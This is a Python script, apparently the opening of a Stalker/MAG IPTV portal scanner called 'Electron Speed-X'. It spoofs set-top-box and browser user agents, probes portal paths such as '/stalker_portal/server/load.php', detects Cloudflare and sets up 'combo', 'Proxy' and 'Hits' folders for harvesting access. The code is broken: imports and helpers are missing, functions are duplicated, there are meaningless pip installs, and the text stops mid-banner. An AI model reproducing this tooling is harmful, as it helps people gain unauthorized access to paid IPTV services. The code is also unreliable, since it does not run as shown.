global envivo
envivo=0
global peliculas
peliculas=0
global series
series=0
global juanka
juanka=""
os.system("cls" if os.name == "nt" else "clear")
def clear_terminal():
    if os.name == "nt":
        os.system("cls")
    else:
        sys.stdout.write("\033[2J\033[H")
        sys.stdout.flush()
def StalkerElectronSpeedX():
    os.system("cls" if os.name == "nt" else "clear")
    clear_terminal()
    print(f"""\33[1;38;5;3m
\n{COR(16)}{FUNDO(15)}      ★      ★      ★      ★      ★      ★       ★      ★      ★            {RESET}\33[1;38;5;3m\n
    ╔═══╦╗──────╔╗─────────╔═══╗──────────╔╗─╔═╗╔═╗               \33[1;38;5;3m
    ║╔══╣║─────╔╝╚╗────────║╔═╗║──────────║║─╚╗╚╝╔╝               \33[1;38;5;3m
    ║╚══╣║╔══╦═╩╗╔╬═╦══╦═╗─║╚══╦══╦══╦══╦═╝║──╚╗╔╝               \33[1;38;5;3m
    ║╔══╣║║║═╣╔═╣║║╔╣╔╗║╔╗╗╚══╗║╔╗║║═╣║═╣╔╗╠══╦╝╚╗               \33[1;38;5;3m
    ║╚══╣╚╣║═╣╚═╣╚╣║║╚╝║║║║║╚═╝║╚╝║║═╣║═╣╚╝╠═╦╝╔╗╚╗               \33[1;38;5;3m
    ╚═══╩═╩══╩══╩═╩╝╚══╩╝╚╝╚═══╣╔═╩══╩══╩══╝─╚═╝╚═╝               \33[1;38;5;3m
    ───────────────────────────║║─by Josiel Jefferson               \33[1;38;5;3m
    ───────────────────────────╚╝────Chemistry Remake               \33[1;38;5;2m
                   ___                      ___
                  (o o)                    (o o)
                 (  V  ) Josiel Jefferson (  V  )
                 --m-m----------------------m-m--
                  𝑬𝒍𝒆𝒄𝒕𝒓𝒐𝒏 𝑺𝒑𝒆𝒆𝒅-𝑿 𝒃𝒚 𝑱𝒐𝒔𝒊𝒆𝒍 𝑱𝒆𝒇𝒇𝒆𝒓𝒔𝒐𝒏             \33[1;0m
\n{COR(16)}{FUNDO(15)}        ᴇʟᴇᴄᴛʀᴏɴ sᴘᴇᴇᴅ-x ᴘʀᴏ sᴄᴀɴɴᴇʀ sᴛᴀʟᴋᴇʀ ᴘᴏʀᴛᴀʟ ᴊᴏsɪᴇʟ ᴊᴇғғᴇʀsᴏɴ       \x1b[1;0m \n
    """)
os.system("cls" if os.name == "nt" else "clear")
def check_os():
    return './' if platform.system() == "Windows" else "/sdcard/"
if check_os() == "./":
    my_os = "Wɪɴᴅᴏᴡs"
else:
    my_os = "Aɴᴅʀᴏɪᴅ"
my_cpu = platform.machine()
my_py = platform.python_version()
StalkerElectronSpeedX()
def check_folders(folder_list):
    for folder in folder_list:
        os.makedirs(check_os() + folder, exist_ok = True)
check_folders(['combo/', 'Proxy/', 'Sounds/', 'Hits/', 'Hits/𝑨𝒖𝒕𝒐 𝑼𝒍𝒕𝒊𝒎𝒂𝒙 𝑰𝑷 𝑪𝒍𝒐𝒖𝒅𝑭𝒍𝒂𝒓𝒆/', 'Hits/𝑨𝒖𝒕𝒐 𝑼𝒍𝒕𝒊𝒎𝒂𝒙 𝑰𝑷 𝑪𝒍𝒐𝒖𝒅𝑭𝒍𝒂𝒓𝒆/𝑨𝒖𝒕𝒐 𝑼𝒍𝒕𝒊𝒎𝒂𝒙 𝑰𝑷 𝑪𝒍𝒐𝒖𝒅𝑭𝒍𝒂𝒓𝒆 𝑪𝒐𝒎𝒃𝒐 𝑴𝒂𝒄𝒔/', 'Hits/𝑨𝒖𝒕𝒐 𝑼𝒍𝒕𝒊𝒎𝒂𝒙 𝑰𝑷 𝑪𝒍𝒐𝒖𝒅𝑭𝒍𝒂𝒓𝒆/𝑨𝒖𝒕𝒐 𝑼𝒍𝒕𝒊𝒎𝒂𝒙 𝑰𝑷 𝑪𝒍𝒐𝒖𝒅𝑭𝒍𝒂𝒓𝒆 𝑯𝒊𝒕𝒔 𝑴𝒊𝒏𝒊/'])
hits = check_os() + 'Hits/𝑨𝒖𝒕𝒐 𝑼𝒍𝒕𝒊𝒎𝒂𝒙 𝑰𝑷 𝑪𝒍𝒐𝒖𝒅𝑭𝒍𝒂𝒓𝒆/'
tempo_inicio = None
def cronometrar_tempo():
    global tempo_inicio
    if tempo_inicio is None:
        tempo_inicio = time.time()
    tempo_atual = time.time()
    tempo_decorrido = int(tempo_atual - tempo_inicio)
    dias = tempo_decorrido // 86400
    horas = (tempo_decorrido % 86400) // 3600
    minutos = (tempo_decorrido % 3600) // 60
    segundos = tempo_decorrido % 60
    partes = []
    if dias > 0:
        partes.append(f"{dias}d")
    if horas > 0:
        partes.append(f"{horas:02}h")
    if minutos > 0:
        partes.append(f"{minutos:02}m")
    if segundos > 0 or not partes:
        partes.append(f"{segundos:02}s")
    tempo_total_string = ':'.join(partes)
    return tempo_total_string
try:
    pass
except:
    pip.main(["install", "subprocess"])
try:
    import threading
except:
    pass
try:
    import requests
except:
    pip.main(["install", "requests"])
    import requests
try:
    pass
except:
    pip.main(["install", "cloudscraper"])
try:
    import flag
except:
    pip.main(["install", "emoji-country-flag"])
    import flag
try:
    pass
except:
    pip.main(["install", "pyshorteners"])
try:
    pass
except:
    pip.main(["install", "getmac<1.0.0"])
try:
    import pycountry
except:
    pip.main(["install", "pycountry"])
    import pycountry
try:
    pass
except:
    pip.main(["install", "geopy"])
try:
    pass
except:
    pip.main(["install", "termcolor"])
try:
    pass
except:
    pip.main(["install", "colorama"])
try:
    import urllib
except:
    pip.main(["install", "urllib"])
    import urllib
try:
    pass
except:
    pip.main(["install", "urllib3"])
try:
    pass
except:
    pip.main(["install", "nodejs"])
try:
    pass
except:
    pip.main(["install", "Faker"])
try:
    pass
except:
    pip.main(["install", "ipaddress"])
say1=0
say2=0
say=0
yanpanel="hata"
imzayan=""
bul=0
hitc=0
prox=0
cpm=0
BLACK = '\x1b[30m'
RED = '\x1b[31m'
GREEN = '\x1b[32m'
YELLOW = '\x1b[33m'
BLUE = '\x1b[34m'
MAGENTA = '\x1b[35m'
CYAN = '\x1b[36m'
WHITE = '\x1b[37m'
RESETz = '\x1b[39m'
GREYa = '\x1b[90m'
REDa = '\x1b[91m'
GREENa = '\x1b[92m'
YELLOWa = '\x1b[93m'
PURPLEa = '\x1b[94m'
PINKa = '\x1b[95m'
CYANa = '\x1b[96m'
REDc = '\x1b[1;31m'
REDx = '\x1b[1;91m'
GREENc = '\x1b[1;32m'
YELLOWc = '\x1b[1;33m'
BLUEc = '\x1b[1;34m'
MAGENTAc = '\x1b[1;35m'
CYANc = '\x1b[1;36m'
WHITEc = '\x1b[1;37m'
RESETc = '\x1b[1;39m'
BRIGHTs = '\x1b[1m'
DIMs = '\x1b[2m'
NORMALs = '\x1b[22m'
RESET = '\x1b[0m'
WV5 = '\x1b[0;4;90m'
PREMI = '\x1b[0;4;90m'
os.system("cls" if os.name == "nt" else "clear")
Green="\033[1;33m"
Blue="  \33[1m\33[7;49;94m"
Grey="\033[1;30m"
Reset="\033[0m"
Red="\033[1;31m"
Purple="\033[0;35m"
c = ""
d = -1
chars = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z']
RED = "\x1b[31m"
GREEN = "\x1b[32m"
YELLOW = "\x1b[33m"
BLUE = "\x1b[34m"
RESET = "\x1b[0m"
GREENa = "\x1b[92m"
REDa = "\x1b[91m"
CYAN = "\x1b[36m"
user_agents_android = [
 "Mozilla/5.0 (Linux; Android 10; SM-G975U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.181 Mobile Safari/537.36",
 "Mozilla/5.0 (Linux; Android 11; Pixel 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.181 Mobile Safari/537.36"]
user_agents_iphone = [
 "Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
 "Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/128.0.345285827 Mobile/15E148 Safari/604.1"]
user_agents_windows = [
 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.181 Safari/537.36",
 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/85.0"]
user_agents_tablet = [
 "Mozilla/5.0 (Linux; Android 8.0; SM-T590) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.181 Safari/537.36",
 "Mozilla/5.0 (iPad; CPU OS 14_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"]
user_agents_desktop = [
 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36",
 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/605.1.15"]
user_agents_set_top_box = [
 "Mozilla/5.0 (SMART-TV; Linux; Tizen 5.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Safari/537.36"]
user_agents_games_console = [
 "Mozilla/5.0 (PlayStation 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Safari/537.36"]
user_agents_bots_crawlers = [
 "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"]
user_agents_e_readers = [
 "Mozilla/5.0 (Linux; Android 9; NOOK HD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36"]
def get_random_user_agent():
    device_type = random.choice(['Android', 'iPhone', 'Windows', 'Tablets', 'Desktops', 'Top_box', 'Games',
     'Bots', 'Readers'])
    if device_type == "Android":
        return random.choice(user_agents_android)
    if device_type == "iPhone":
        return random.choice(user_agents_iphone)
    if device_type == "Windows":
        return random.choice(user_agents_windows)
    if device_type == "Tablets":
        return random.choice(user_agents_tablet)
    if device_type == "Desktops":
        return random.choice(user_agents_desktop)
    if device_type == "Top_box":
        return random.choice(user_agents_set_top_box)
    if device_type == "Games":
        return random.choice(user_agents_games_console)
    if device_type == "Bots":
        return random.choice(user_agents_bots_crawlers)
    if device_type == "Readers":
        return random.choice(user_agents_e_readers)
user_agent = get_random_user_agent()
os.system("cls" if os.name == "nt" else "clear")
user_agents_list = [
    'Mozilla/5.0 (iPad; CPU OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.83 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36',
    'Mozilla/5.0 (X11; U; Linux i686; en-GB; rv:1.7.6) Gecko/20050405 Epiphany/1.6.1 (Ubuntu) (Ubuntu package 1.0.2)',
    'Mozilla/5.0 (X11; Linux i686; U;rv: 1.7.13) Gecko/20070322 Kazehakase/0.4.4.1',
    'Mozilla/5.0 (X11; U; Linux 2.4.2-2 i586; en-US; m18) Gecko/20010131 Netscape6/6.01',
    'Mozilla/5.0 (X11; U; Linux i686; de-AT; rv:1.8.0.2) Gecko/20060309 SeaMonkey/1.0',
    'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 13_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.5 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPad; CPU OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0',
    'Mozilla/5.0 (Android 13; Mobile; rv:109.0) Gecko/119.0 Firefox/119.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 12_2_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36 [ip:127.0.0.1:80]',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 [ip:127.0.0.1:80]',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 [ip:127.0.0.1:80]',
    'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36 [ip:127.0.0.1:80]',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 [ip:127.0.0.1:80]',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 [ip:127.0.0.1:80]',
]
HEADERA1 = {
    "User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3",
    "Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml + xml,application/xml;q=0.9,*/*;q=0.8",
    "Cookie": "stb_lang=en; timezone=Europe/Paris;",
    "Accept-Encoding": "gzip, deflate",
    "Connection": "Keep-Alive",
    "X-User-Agent": "Model: MAG254; Link: Ethernet",
}
def get_location_info(panelx):
    try:
        infof = f"http://ip-api.com/json/{panelx}"
        response = requests.get(infof)
        response.raise_for_status()
        data = response.json()
        country = data.get("country")
        city = data.get("city")
        isp = data.get("isp")
        query = data.get("query")
        countrycode = data.get("countryCode")
        if countrycode is None:
            return (country, city, isp, query, "Country code unavailable")
        OFFSET = ord('🇦') - ord('A')
        bandeira = chr(ord(countrycode[0]) + OFFSET) + chr(ord(countrycode[1]) + OFFSET)
        localx = f"{bandeira} {country} [{countrycode}]"
        return (country, city, isp, query, localx)
    except requests.RequestException:
        return (None, None, None, None, '')
def get_location_info(panelx):
    global localx
    try:
        infof = f"http://ip-api.com/json/{panelx}"
        response = requests.get(infof)
        response.raise_for_status()
        data = response.json()
        country = data.get("country", "Unknown")
        city = data.get("city", "Unknown")
        isp = data.get("isp", "Unknown")
        query = data.get("query", "Unknown")
        countrycode = data.get("countryCode", "")
        flag = ""
        if countrycode:
            for char in countrycode:
                flag += chr(ord(char) + 127397)
            flag = flag.upper()
            localx = f"{flag} {country} [{countrycode}]"
        else:
            localx = f"{country} [NO-CODE]"
        return (
         country, city, isp, query, localx)
    except requests.RequestException:
        localx = "Unknown Location"
        return (None, None, None, None, localx)
def check_http(panelx):
    try:
        HTTP_URL = f"http://{panelx}"
        parsed_url = urlparse(HTTP_URL)
        connection = HTTPConnection(parsed_url.netloc, timeout=2)
        connection.request("HEAD", parsed_url.path or "/")
        response = connection.getresponse()
        return (True, response.status)
    except Exception:
        return (False, 'OFF')
def check_https(panelx):
    try:
        HTTPS_URL = f"https://{panelx}"
        parsed_url = urlparse(HTTPS_URL)
        connection = HTTPSConnection(parsed_url.netloc, timeout=2)
        connection.request("HEAD", parsed_url.path or "/")
        response = connection.getresponse()
        return (True, response.status)
    except Exception:
        return (False, 'OFF')
def search_panel(url):
    best_result = {"status": "", "url": ""}
    scan_results = []
    def print_status(status_code, admin):
        status = "\33[1;92m"
        fx = ""
        if status_code == 200:
            status = "\33[1;92m   ᴀᴠᴀɪʟᴀʙʟᴇ [ 200 ]\33[0m"
            fx = "\33[1;32m"
        if status_code == 401:
            status = "\33[1;95m   Unauthorized [ 401 ]\33[0m"
            fx = "\33[1;32m"
        if status_code == 403:
            status = "\33[1;91m   Fᴏʀʙɪᴅᴅᴇɴ [ 403 ]\33[0m"
            fx = "\33[1;32m"
        if status_code == 512:
            status = "\33[1;94m   Eʀʀᴏʀ [ 512 ]\33[0m"
            fx = "\33[1;32m"
        if status_code == 503:
            status = "\33[1;95m   Service ᴜɴᴀᴠᴀɪʟᴀʙʟᴇ [ 503 ]\33[0m"
            fx = "\33[1;32m"
        if status_code == 520:
            status = "\33[1;95m   Unknown error [ 520 ]\33[0m"
            fx = "\33[1;32m"
        if status_code == 404:
            status = "\33[31m   ɴᴏᴛ Fᴏᴜɴᴅ [ 404 ]\33[0m"
            fx = "\33[1;32m"
        if status_code == 301:
            status = "\33[1;94m   ʀᴇᴅɪʀᴇᴄᴛ [ 301 ]\33[0m"
            fx = "\33[1;32m"
        if status_code == 500:
            status = "\33[1;94m   Sᴇʀᴠᴇʀ Eʀʀᴏʀ [ 500 ]\33[0m"
            fx = "\33[1;32m"
        if status_code == 429:
            status = "\33[1;94m   ʀᴍᴀɴʏ ʀᴇqᴜᴇsᴛs [ 429 ]\33[0m"
            fx = "\33[1;32m"
        if status_code == 302:
            status = "\33[1;94m   ᴍᴏᴠᴇᴅ ᴛᴇᴍᴘᴏʀᴀʀɪʟʏ [ 302 ]\33[0m"
            fx = "\33[1;32m"
        scan_result = f"{status} {admin}"
        scan_results.append(scan_result)
        return status
    payload = [
        '/portal.php',
        '/c/portal.php',
        '/server/load.php',
        '/c/server/load.php',
        '/stalker_portal/server/load.php',
        '/portal.php - Real Blue',
        '/portal.php - httpS',
        '/portalott.php',
        '/stalker_u.php',
        '/stalker_portal/server/load.php - old',
        '/stalker_portal/server/load.php - «▣»',
        '/stalker_portal/server/load.php - httpS',
        '/BoSSxxxx/portal.php',
        '/magaccess/portal.php',
    ]
    for admin in payload:
        try:
            get_request = requests.get(url + admin, headers={'User-Agent': random.choice(user_agents_list)}, timeout=5)
            status_code = get_request.status_code
            result = print_status(status_code, admin)
            if result == "\33[92m [ 200 ]\33[0m" and (best_result["status"] != "\33[92m [ 200 ]\33[0m" or len(admin) < len(best_result["url"])):
                best_result["status"] = result
                best_result["url"] = admin
            if result == "\33[95m [ 401 ]\33[0m" and (best_result["status"] != "\33[95m [ 401 ]\33[0m" or len(admin) < len(best_result["url"])):
                best_result["status"] = result
                best_result["url"] = admin
            if result == "\33[94m [ 512 ]\33[0m" and (best_result["status"] != "\33[94m [ 512 ]\33[0m" or len(admin) < len(best_result["url"])):
                best_result["status"] = result
                best_result["url"] = admin
        except (requests.ConnectionError, requests.Timeout):
            scan_results.append(f"\33[1;31m   No connection\33[0m for {admin}")
    return scan_results, best_result
def run_scan(panel):
    time.sleep(1)
    print(f"       {GREEN}Verificando Portal & Protocolo {RESET}\n{YELLOW}           Aguarde, por favor...[->] {RESET}")
    time.sleep(1.5)
    panel = panel.replace("https://", "").replace("http://", "").replace("/c/", "").replace("/c", "")
    panelx = panel.split(":")[0] if ":" in panel else panel
    is_http_online, http_status = check_http(panelx)
    is_https_online, https_status = check_https(panelx)
    country, city, isp, query, localx = get_location_info(panelx)
    if not country:
        country = "ɴo coᴜɴᴛʀʏ"
    if not city:
        city = "ɴo cɪᴛʏ"
    if not query:
        query = "ɴo ɪᴘ ꜰɪɴᴅᴇʀ"
    if isp == "Cloudflare, Inc.":
        isp = "Yᴇs-CʟoᴜᴅFʟᴀʀᴇ"
        cfs = "ʏᴇs-cʟoᴜᴅ-ᴘᴀss"
    elif not isp:
        isp = "CʟoᴜᴅEʀʀoʀ"
        cfs = "ꜰᴀᴛᴀʟ-ᴇʀʀoʀ"
    else:
        isp = "Noᴛ-CʟoᴜᴅFʟᴀʀᴇ"
        cfs = "ɴoᴛ-cʟoᴜᴅ-ғʀᴇᴇ"
    if is_http_online:
        prtclx = "HTTP"
        statuscode = http_status
        result_summary = f"\n   {YELLOW}╓>http://{panel} {RESET}\n   {YELLOW}╠[HTTP] {GREEN}Protocol ➺  {YELLOW}Host {GREENa}ONLINE {RESET}"
    elif is_https_online:
        prtclx = "HTTPS"
        statuscode = https_status
        result_summary = f"\n   {YELLOW}╓>https://{panel} {RESET}\n   {YELLOW}╠[HTTPS] {GREEN}Protocol ➺  {YELLOW}Host {GREENa}ONLINE {RESET}"
    else:
        prtclx = "HTTP"
        statuscode = http_status
        HTTPFAIL = "FAILED"
        result_summary = f"\n   {YELLOW}╓>SERVIDOR ➺ {panel} {RESET}\n   {YELLOW}╠{COR(14)}FALHA ao verificar o protocolo! {RESET}\n   {YELLOW}╠DICA: {COR(14)}Utilize um proxy e prossiga. {RESET}"
    statusY = {
        200: "\x1b[92m[200]",
        403: "\x1b[95m[403]",
        404: "\x1b[93m[404]",
        513: "\x1b[97m[513]",
        "OFF": "\x1b[91m[OFF]"
    }.get(statuscode, f"\x1b[94m[{statuscode}]")
    result_summary += f"\n   {YELLOW}╠{COR(14)}[{isp}]{YELLOW}➺ Código: {RESET}{statusY} {RESET}\n   {YELLOW}╠{GREEN}•VPN➺ {YELLOW}[{localx}]{CYAN}➺ {city} {RESET}\n   {YELLOW}╠{GREEN}•IP do Servidor➺ {YELLOW}[{query}] {RESET}\n   {YELLOW}╙>{GREEN}SUCESSO➺ Dados do Portal Coletados! \n"
    os.system("cls" if os.name == "nt" else "clear")
    tags = ['https://', 'http://', '/stalker_portal/c/index.html', '/stalker_portal', '/rmxportal', '/cmdforex', '/portalstb', '/magLoad', '/maglove', '/client', '/portalmega', '/ministra', '/korisnici', '/ghandi_portal', '/magaccess', '/blowportal', '/emu2', '/emu', '/tek', '/Link_OK', '/bs.mag.portal', '/bStream', '/delko', '/portal', '/c/', '/k/', '/k', '/BoSSxxxx/', '/BoSSxxxx', '/powerfull/', '/xx/', '/xx', '/', ' ']
    for tag in tags:
        panel = panel.replace(tag, '')
    port = ""
    iport = ""
    if ":" in panel:
        port = panel.split(":")[1]
        panel = panel.split(':')[0]
        iport = ":" + port
    fyz = prtclx.lower() + "://" + panel + iport
    os.system("cls" if os.name == "nt" else "clear")
    StalkerElectronSpeedX()
    print("\33[3m\33[1m\33[93m              ========== ᴠᴇʀɪғɪᴄᴀʀ sᴛᴀᴛᴜs ᴅᴏ ᴘᴏʀᴛᴀʟ ==========              \33[0m\n")
    try:
        requests.get(str(fyz), headers=HEADERA1, timeout=7, verify=False)
        dgr = '\33[1;92m ' + str(fyz).replace('http://', '').replace('https://', '') + '   ONLINE     \33[0m\n'
        print(dgr)
        time.sleep(3)
    except:
        pass
    try:
        headerc = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko", "Pragma": "no-cache", "Accept": "*/*"}
        link = fyz.replace('http://', '').replace('https://', '').replace('/c/', '').replace('/c', '').replace('http://', '').replace('/', '').replace('\n', '')
        url25 = "https://us.host-tools.com/website-status/" + link + "/http"
        res = requests.get(url25, headers=headerc, timeout=15, verify=False)
        veri1 = str(res.text).split('<title>')[1].split('</title>')[0]
        if 'ONLINE' in veri1:
            renk = '\33[1;33m '
            result_message = '\33[1;92m ' + str(fyz).replace('http://', '').replace('https://', '') + '   ONLINE          \33[0m\n\n\33[38;5;229m As informações a seguir:\n Agradecemos pela sua paciência; a análise está em andamento.\33[0m\n\n'
            print(result_message)
            time.sleep(1.5)
        else:
            if 'OFFLINE' in veri1:
                renk = '\33[1;91m '
            else:
                renk = '\33[1;92m '
            dgr = renk + str(fyz).replace('\n', '') + '   ONLINE      \33[0m\n'
            print(dgr)
            time.sleep(1.5)
    except Exception as e:
        renk = '\33[1;91m '
        dgr = renk + str(fyz).replace('\n', '') + '    OFFLINE     \33[0m\n'
        print(dgr)
        time.sleep(1.5)
    ses = requests.session()
    if 'http://' in panel or 'https://' in panel:
        panel = panel.split("://")[1]
        panel = panel.split('/')[0]
    panel = panel.replace('/c/', '')
    panel = panel.replace('/c', '')
    panel = panel.replace('/', '')
    url = "http://" + panel
    scan_results, best_result = search_panel(url)
    final_result = "\n".join(scan_results)
    if best_result["url"]:
        final_result += f"\n \33[33mRecomendado para o Scan \33[92m({best_result['url']})\33[0m"
    final_result += ("\n" + result_summary + "\n")
    print(final_result)
    conti = input(f"\n   {COR(2)}𝐏𝐑𝐄𝐒𝐒𝐈𝐎𝐍𝐄 𝐄𝐍𝐓𝐄𝐑 𝐏𝐀𝐑𝐀 𝐂𝐎𝐍𝐓𝐈𝐍𝐔𝐀𝐑...      {RESET}\n")
while True:
    os.system("cls" if os.name == "nt" else "clear")
    StalkerElectronSpeedX()
    if not panel:
        print("\x1b[1;91mPor favor, informe o nome do servidor. Encerrando...\x1b[0m")
        break
    run_scan(panel)
    time.sleep(1.5)
    break
try:
    pass
except:
    pip.main(['install', 'subprocess'])
try:
    import threading
except:
    pass
try:
    import requests
except:
    pip.main(['install', 'requests'])
    import requests
os.system("cls" if os.name == "nt" else "clear")
try:
    pass
except:
    pip.main(['install', 'cloudscraper'])
os.system("cls" if os.name == "nt" else "clear")
try:
    import flag
except:
    pip.main(['install', 'emoji-country-flag'])
    import flag
try:
    pass
except:
    pip.main(['install', 'pyshorteners'])
os.system("cls" if os.name == "nt" else "clear")
try:
    pass
except:
    pip.main(['install', 'getmac<1.0.0'])
os.system("cls" if os.name == "nt" else "clear")
try:
    import pycountry
except:
    pip.main(['install', 'pycountry'])
    import pycountry
os.system("cls" if os.name == "nt" else "clear")
try:
    pass
except:
    pip.main(['install', 'geopy'])
os.system("cls" if os.name == "nt" else "clear")
try:
    pass
except:
    pip.main(['install', 'termcolor'])
os.system("cls" if os.name == "nt" else "clear")
try:
    pass
except:
    pip.main(['install', 'colorama'])
os.system("cls" if os.name == "nt" else "clear")
try:
    import urllib
except:
    pip.main(['install', 'urllib'])
    import urllib
os.system("cls" if os.name == "nt" else "clear")
try:
    pass
except:
    pip.main(['install', 'urllib3'])
os.system("cls" if os.name == "nt" else "clear")
try:
    pass
except:
    pip.main(['install', 'nodejs'])
try:
    pass
except:
    pip.main(['install', 'Faker'])
try:
    pass
except:
    pip.main(['install', 'ipaddress'])
os.system("cls" if os.name == "nt" else "clear")
try:
    import androidhelper as sl4a
    ad = sl4a.Android()
except:
    pass
try:
    pass
except:
    pip.main(['install', 'requests[socks]'])
    pip.main(['install', 'sock'])
    pip.main(['install', 'socks'])
    pip.main(['install', 'PySocks'])
os.system("cls" if os.name == "nt" else "clear")
requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS = 'TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA:TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_AES_128_GCM_SHA256:TLS_RSA_WITH_AES_256_GCM_SHA384:TLS_RSA_WITH_AES_128_CBC_SHA:TLS_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_3DES_EDE_CBC_SHA:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:TLS13-AES-256-GCM-SHA384:ECDHE:!COMP'
try:
    sesq = requests.Session()
    option = cfscrape.create_scraper(sess=sesq)
except:
    option = requests.Session()
os.system("cls" if os.name == "nt" else "clear")
try:
	import cfscrape
	sesq= requests.Session()
	ses = cfscrape.create_scraper(sess=sesq)
except:
	ses= requests.Session()
time_= time.localtime()
current_time = time.strftime("%d/%m/%Y - %H:%M:%S", time_)
hora_ini = time.strftime("%d/%m/%Y - %H:%M:%S", time_)
timestr = time.strftime("%d-%m-%Y")
say1=0
say2=0
say=0
yanpanel="hata"
imzayan=""
bul=0
hitc=0
prox=0
cpm=0
os.system("cls" if os.name == "nt" else "clear")
c = ""
d = -1
chars = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z']
def a(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.01)
a(f"""
\n{COR(16)}{FUNDO(15)}      ★      ★      ★      ★      ★      ★       ★      ★      ★            {RESET}\33[1;38;5;3m\n
    ╔═══╦╗──────╔╗─────────╔═══╗──────────╔╗─╔═╗╔═╗               \33[1;38;5;3m
    ║╔══╣║─────╔╝╚╗────────║╔═╗║──────────║║─╚╗╚╝╔╝               \33[1;38;5;3m
    ║╚══╣║╔══╦═╩╗╔╬═╦══╦═╗─║╚══╦══╦══╦══╦═╝║──╚╗╔╝               \33[1;38;5;3m
    ║╔══╣║║║═╣╔═╣║║╔╣╔╗║╔╗╗╚══╗║╔╗║║═╣║═╣╔╗╠══╦╝╚╗               \33[1;38;5;3m
    ║╚══╣╚╣║═╣╚═╣╚╣║║╚╝║║║║║╚═╝║╚╝║║═╣║═╣╚╝╠═╦╝╔╗╚╗               \33[1;38;5;3m
    ╚═══╩═╩══╩══╩═╩╝╚══╩╝╚╝╚═══╣╔═╩══╩══╩══╝─╚═╝╚═╝               \33[1;38;5;3m
    ───────────────────────────║║─by Josiel Jefferson               \33[1;38;5;3m
